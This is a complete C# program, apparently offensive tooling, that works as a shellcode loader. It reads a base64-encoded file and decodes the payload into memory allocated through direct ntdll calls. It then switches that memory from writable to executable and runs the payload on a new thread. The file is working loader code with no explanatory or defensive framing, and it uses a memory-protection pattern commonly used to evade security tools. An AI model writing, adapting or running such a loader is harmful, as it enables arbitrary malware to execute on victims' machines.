using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Loader2
{
    internal class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: Loader2.exe <base64_file_path>");
                return;
            }

            string base64FilePath = args[0];

            byte[] shellcode;
            string base64Shellcode = File.ReadAllText(base64FilePath);
            shellcode = Convert.FromBase64String(base64Shellcode);

            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            NtAllocateVirtualMemory(
                (IntPtr)(-1),
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                0x1000 | 0x2000, // MEM_COMMIT | MEM_RESERVE
                0x04);           // PAGE_READWRITE

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            uint oldProtect;
            NtProtectVirtualMemory(
                (IntPtr)(-1),
                ref baseAddress,
                ref regionSize,
                0x20,            // PAGE_EXECUTE_READ
                out oldProtect);

            Thread thread = new Thread(() =>
            {
                IntPtr functionPointer = baseAddress;
                var functionDelegate = Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(ThreadStart));
                functionDelegate.DynamicInvoke();
            });

            thread.Start();
            thread.Join();
        }
    }
}


